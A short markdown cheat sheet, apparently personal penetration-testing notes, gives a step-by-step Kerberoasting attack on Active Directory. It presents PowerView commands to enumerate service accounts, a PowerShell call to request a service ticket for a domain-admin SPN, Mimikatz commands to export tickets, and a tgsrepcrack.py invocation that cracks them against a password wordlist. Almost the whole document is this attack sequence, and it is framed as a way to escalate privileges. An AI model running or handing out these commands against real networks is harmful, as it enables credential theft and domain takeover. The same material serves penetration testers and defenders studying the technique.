# Kerberost

## Methodology/Steps
> 1. First find all the SPN accounts
> 2. Select SPN of a domain admin since we doing privilege escalation
> 3. Set the SPN as the argumentlist value and create a new object ( request a TGS )
> 4. Export the all the tickets by mimikatz
> 5. Keep a note of the file name where the ticket is stored of that service
> 6. Crack the ticket


## Find user accounts used as Service account
```powershell
Get-NetUser -SPN
Get-NetUser -SPN -Verbose | select displayname,memberof
```

## Request TGS 
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/computer.domain.local"
```

## Check if the TGS has been granted
```powershell
klist
```

## Export all the tickets
> Copy the file name of the ticket you exported; In this case its the file path for MSSQLSvc
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

## tgsrepcrack
> **Request-SPNTicket** with PowerView can be used for cracking with JTR
```python
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-user1@MSSQLSvc~computer.domain.localDOMAIN.LOCAL.kirbi
```
